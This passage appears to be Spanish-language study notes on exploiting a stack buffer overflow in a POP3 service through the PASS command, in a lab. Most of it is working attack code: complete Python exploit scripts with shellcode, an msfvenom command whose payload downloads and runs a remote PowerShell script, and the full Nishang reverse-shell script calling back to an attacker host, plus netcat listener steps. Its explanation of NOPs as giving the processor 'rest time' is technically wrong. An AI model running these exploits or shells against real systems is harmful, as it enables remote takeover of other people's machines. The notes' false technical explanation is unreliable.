b"\xeb\xb6\xb0\x1a\xe8\x49\x14\x11\x14\xc1\x9b\xf5"
b"\x9c\x91\xbf\xd1\xc5\x42\xa1\x40\xa0\x25\xde\x92"
b"\x0b\x99\x7a\xd9\xa6\xce\xf6\x80\xae\x23\x3b\x3a"
b"\x2f\x2c\x4c\x49\x1d\xf3\xe6\xc5\x2d\x7c\x21\x12"
b"\x51\x57\x95\x8c\xac\x58\xe6\x85\x6a\x0c\xb6\xbd"
b"\x5b\x2d\x5d\x3d\x63\xf8\xf2\x6d\xcb\x53\xb3\xdd"
b"\xab\x03\x5b\x37\x24\x7b\x7b\x38\xee\x14\x16\xc3"
b"\x79\xdb\x4f\xca\xf7\xb3\x8d\xcc\x24\x6c\x1b\x2a"
b"\x40\x7c\x4d\xe5\xfd\xe5\xd4\x7d\x9f\xea\xc2\xf8"
b"\x9f\x61\xe1\xfd\x6e\x82\x8c\xed\x07\x62\xdb\x4f"
b"\x81\x7d\xf1\xe7\x4d\xef\x9e\xf7\x18\x0c\x09\xa0"
b"\x4d\xe2\x40\x24\x60\x5d\xfb\x5a\x79\x3b\xc4\xde"
b"\xa6\xf8\xcb\xdf\x2b\x44\xe8\xcf\xf5\x45\xb4\xbb"
b"\xa9\x13\x62\x15\x0c\xca\xc4\xcf\xc6\xa1\x8e\x87"
b"\x9f\x89\x10\xd1\x9f\xc7\xe6\x3d\x11\xbe\xbe\x42"
b"\x9e\x56\x37\x3b\xc2\xc6\xb8\x96\x46\xe6\x5a\x32"
b"\xb3\x8f\xc2\xd7\x7e\xd2\xf4\x02\xbc\xeb\x76\xa6"
b"\x3d\x08\x66\xc3\x38\x54\x20\x38\x31\xc5\xc5\x3e"
b"\xe6\xe6\xcf")


payload = yunk + EIP + ESP

def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()

if __name__ == '__main__':

	exploit()
```

- Creamos un Breakpoint para ver si el flujo del programa pasa por el Jump ESP

![](/img2/4o92adh6.png)

![](/img2/e2x4qo98.png)

- Comprobamos si se ha realizado el Jump ESP viendo que el ESP y el EIP es el mismo valor

```bash
python3 exploit.py
```

![](/img2/8ilov05x.png)

![](/img2/2i7lagna.png)

> Como tenemos el EIP (apunta a la siguiente instrucción) controlado, es necesario inyectar un Jump ESP para así lograr que el flujo del programa nos mande al ESP y así poder inyectar nuestra ShellCode

> El EIP ejecuta la siguiente instrucción y por eso necesitamos emplear un salto hacia el ESP que es donde hay espacio para inyectar la ShellCode. De esta forma el EIP estaría ejecutando en realidad el ESP


## (Opción 1) Ejecutar el Shellcode con NOPs

```python
#!/usr/bin/env python3

from struct import pack
import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = pack("<L", 0x5f4c4d13)


ESP=(b"\xda\xdf\xd9\x74\x24\xf4\xbd\xdd\x29\x1c\xe4\x5a"
b"\x2b\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\x37"
b"\xd5\xfe\x11\x3b\xce\x7d\xd9\xc3\x0f\xe2\x53\x26"
b"\x3e\x22\x07\x23\x11\x92\x43\x61\x9e\x59\x01\x91"
b"\x15\x2f\x8e\x96\x9e\x9a\xe8\x99\x1f\xb6\xc9\xb8"
b"\xa3\xc5\x1d\x1a\x9d\x05\x50\x5b\xda\x78\x99\x09"
b"\xb3\xf7\x0c\xbd\xb0\x42\x8d\x36\x8a\x43\x95\xab"
b"\x5b\x65\xb4\x7a\xd7\x3c\x16\x7d\x34\x35\x1f\x65"
b"\x59\x70\xe9\x1e\xa9\x0e\xe8\xf6\xe3\xef\x47\x37"
b"\xcc\x1d\x99\x70\xeb\xfd\xec\x88\x0f\x83\xf6\x4f"
b"\x6d\x5f\x72\x4b\xd5\x14\x24\xb7\xe7\xf9\xb3\x3c"
b"\xeb\xb6\xb0\x1a\xe8\x49\x14\x11\x14\xc1\x9b\xf5"
b"\x9c\x91\xbf\xd1\xc5\x42\xa1\x40\xa0\x25\xde\x92"
b"\x0b\x99\x7a\xd9\xa6\xce\xf6\x80\xae\x23\x3b\x3a"
b"\x2f\x2c\x4c\x49\x1d\xf3\xe6\xc5\x2d\x7c\x21\x12"
b"\x51\x57\x95\x8c\xac\x58\xe6\x85\x6a\x0c\xb6\xbd"
b"\x5b\x2d\x5d\x3d\x63\xf8\xf2\x6d\xcb\x53\xb3\xdd"
b"\xab\x03\x5b\x37\x24\x7b\x7b\x38\xee\x14\x16\xc3"
b"\x79\xdb\x4f\xca\xf7\xb3\x8d\xcc\x24\x6c\x1b\x2a"
b"\x40\x7c\x4d\xe5\xfd\xe5\xd4\x7d\x9f\xea\xc2\xf8"
b"\x9f\x61\xe1\xfd\x6e\x82\x8c\xed\x07\x62\xdb\x4f"
b"\x81\x7d\xf1\xe7\x4d\xef\x9e\xf7\x18\x0c\x09\xa0"
b"\x4d\xe2\x40\x24\x60\x5d\xfb\x5a\x79\x3b\xc4\xde"
b"\xa6\xf8\xcb\xdf\x2b\x44\xe8\xcf\xf5\x45\xb4\xbb"
b"\xa9\x13\x62\x15\x0c\xca\xc4\xcf\xc6\xa1\x8e\x87"
b"\x9f\x89\x10\xd1\x9f\xc7\xe6\x3d\x11\xbe\xbe\x42"
b"\x9e\x56\x37\x3b\xc2\xc6\xb8\x96\x46\xe6\x5a\x32"
b"\xb3\x8f\xc2\xd7\x7e\xd2\xf4\x02\xbc\xeb\x76\xa6"
b"\x3d\x08\x66\xc3\x38\x54\x20\x38\x31\xc5\xc5\x3e"
b"\xe6\xe6\xcf")


payload = yunk + EIP + b"\x90"*20 + ESP


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```bash
python3 exploit.py
rlwrap nc -nlvp 9000
```

> El empleo de NOPs es necesario ya que la instrucción del Shellcode es demasiado densa y el procesador necesita un tiempo de descanso otorgado por estos NOPs (\x90)


## (Opción 2) Ejecutar el Shellcode con un desplazamiento de la pila

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

![](/img2/i5m5ii6j.png)

```python
#!/usr/bin/env python3

from struct import pack
import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = pack("<L", 0x5f4c4d13)


ESP=(b"\xda\xdf\xd9\x74\x24\xf4\xbd\xdd\x29\x1c\xe4\x5a"
b"\x2b\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17\x83\x37"
b"\xd5\xfe\x11\x3b\xce\x7d\xd9\xc3\x0f\xe2\x53\x26"
b"\x3e\x22\x07\x23\x11\x92\x43\x61\x9e\x59\x01\x91"
b"\x15\x2f\x8e\x96\x9e\x9a\xe8\x99\x1f\xb6\xc9\xb8"
b"\xa3\xc5\x1d\x1a\x9d\x05\x50\x5b\xda\x78\x99\x09"
b"\xb3\xf7\x0c\xbd\xb0\x42\x8d\x36\x8a\x43\x95\xab"
b"\x5b\x65\xb4\x7a\xd7\x3c\x16\x7d\x34\x35\x1f\x65"
b"\x59\x70\xe9\x1e\xa9\x0e\xe8\xf6\xe3\xef\x47\x37"
b"\xcc\x1d\x99\x70\xeb\xfd\xec\x88\x0f\x83\xf6\x4f"
b"\x6d\x5f\x72\x4b\xd5\x14\x24\xb7\xe7\xf9\xb3\x3c"
b"\xeb\xb6\xb0\x1a\xe8\x49\x14\x11\x14\xc1\x9b\xf5"
b"\x9c\x91\xbf\xd1\xc5\x42\xa1\x40\xa0\x25\xde\x92"
b"\x0b\x99\x7a\xd9\xa6\xce\xf6\x80\xae\x23\x3b\x3a"
b"\x2f\x2c\x4c\x49\x1d\xf3\xe6\xc5\x2d\x7c\x21\x12"
b"\x51\x57\x95\x8c\xac\x58\xe6\x85\x6a\x0c\xb6\xbd"
b"\x5b\x2d\x5d\x3d\x63\xf8\xf2\x6d\xcb\x53\xb3\xdd"
b"\xab\x03\x5b\x37\x24\x7b\x7b\x38\xee\x14\x16\xc3"
b"\x79\xdb\x4f\xca\xf7\xb3\x8d\xcc\x24\x6c\x1b\x2a"
b"\x40\x7c\x4d\xe5\xfd\xe5\xd4\x7d\x9f\xea\xc2\xf8"
b"\x9f\x61\xe1\xfd\x6e\x82\x8c\xed\x07\x62\xdb\x4f"
b"\x81\x7d\xf1\xe7\x4d\xef\x9e\xf7\x18\x0c\x09\xa0"
b"\x4d\xe2\x40\x24\x60\x5d\xfb\x5a\x79\x3b\xc4\xde"
b"\xa6\xf8\xcb\xdf\x2b\x44\xe8\xcf\xf5\x45\xb4\xbb"
b"\xa9\x13\x62\x15\x0c\xca\xc4\xcf\xc6\xa1\x8e\x87"
b"\x9f\x89\x10\xd1\x9f\xc7\xe6\x3d\x11\xbe\xbe\x42"
b"\x9e\x56\x37\x3b\xc2\xc6\xb8\x96\x46\xe6\x5a\x32"
b"\xb3\x8f\xc2\xd7\x7e\xd2\xf4\x02\xbc\xeb\x76\xa6"
b"\x3d\x08\x66\xc3\x38\x54\x20\x38\x31\xc5\xc5\x3e"
b"\xe6\xe6\xcf")


payload = yunk + EIP + b"\x83\xEC\x10" + ESP


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```bash
python3 exploit.py
rlwrap nc -nlvp 9000
```


> De esta forma estás haciendo un desplazamiento de pila de 16 bytes, dando tiempo al procesador a ejecutar la Shellcode


## Creación de Shellcode controlando el comando  

```bash
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.142/PS.ps1')" --platform windows -a x86 LHOST=192.168.1.142 LPORT=9000 -f py EXITFUNC=thread -b '\x00\x0a\x0d'
```

```python
#!/usr/bin/env python3

from struct import pack
import socket
import sys


## Global variables
ip_address = "192.168.1.151"
port = 110
offset = 4654

yunk = b"A"*offset

EIP = pack("<L", 0x5f4c4d13)


ESP=(b"\xd9\xcf\xbb\x41\x01\x98\xcc\xd9\x74\x24\xf4\x58"
b"\x29\xc9\xb1\x44\x31\x58\x1a\x83\xe8\xfc\x03\x58"
b"\x16\xe2\xb4\xfd\x70\x4e\x36\xfe\x80\x2f\xbf\x1b"
b"\xb1\x6f\xdb\x68\xe2\x5f\xa8\x3d\x0f\x2b\xfc\xd5"
b"\x84\x59\x28\xd9\x2d\xd7\x0e\xd4\xae\x44\x72\x77"
b"\x2d\x97\xa6\x57\x0c\x58\xbb\x96\x49\x85\x31\xca"
b"\x02\xc1\xe7\xfb\x27\x9f\x3b\x77\x7b\x31\x3b\x64"
b"\xcc\x30\x6a\x3b\x46\x6b\xac\xbd\x8b\x07\xe5\xa5"
b"\xc8\x22\xbc\x5e\x3a\xd8\x3f\xb7\x72\x21\x93\xf6"
b"\xba\xd0\xea\x3f\x7c\x0b\x99\x49\x7e\xb6\x99\x8d"
b"\xfc\x6c\x2c\x16\xa6\xe7\x96\xf2\x56\x2b\x40\x70"
b"\x54\x80\x07\xde\x79\x17\xc4\x54\x85\x9c\xeb\xba"
b"\x0f\xe6\xcf\x1e\x4b\xbc\x6e\x06\x31\x13\x8f\x58"
b"\x9a\xcc\x35\x12\x37\x18\x44\x79\x52\xdf\xdb\x07"
b"\x10\xdf\xe3\x07\x05\x88\xd2\x8c\xca\xcf\xeb\x46"
b"\xaf\x30\x0e\x43\xda\xd8\x96\x06\x67\x85\x29\xfd"
b"\xa4\xb0\xa9\xf4\x54\x47\xb1\x7c\x50\x03\x76\x6c"
b"\x28\x1c\x12\x92\x9f\x1d\x37\xe2\x70\x95\xd2\x71"
b"\xfc\x31\x79\x1a\x6e\xe2\xc8\xa7\x36\xca\x84\x42"
b"\xb0\x27\x57\xef\x54\x5d\x04\x9b\x88\xd3\xaf\x17"
b"\xe7\xbc\x4a\xba\xb4\x2e\xfd\x5f\x55\xdb\xd4\xb1"
b"\xcd\x4c\x51\xa0\x61\xfc\xfc\x58\x29\x76\x8c\xc9"
b"\xa3\x11\x58\x2d\x54\xaa\xec\x41\x9e\x7d\x23\x93"
b"\xe7\xb3\x15\xe2\x21\x8c\x47\x35\x60\xdd\xa3\x07"
b"\x53\x4d\x98\x49\xdb\x1e\x2f\xb1\x32\xe1")


payload = yunk + EIP + b"\x83\xEC\x10" + ESP


def exploit():
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect((ip_address,port))

	banner = s.recv(1024)


	s.send(b"USER test" + b'\r\n')

	response = s.recv(1024)

	s.send(b"PASS " + payload + b'\r\n')
	s.close()


if __name__ == '__main__':

	exploit()
```

```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.142 -Port 9000
```

```bash
python3 -m http.server 80
```

```bash
python3 exploit.py
rlwrap nc -nlvp 9000
```


## Si no aparecen resultados en el !mona find -s ...

```
!mona findwild -s "JMP ESP"
```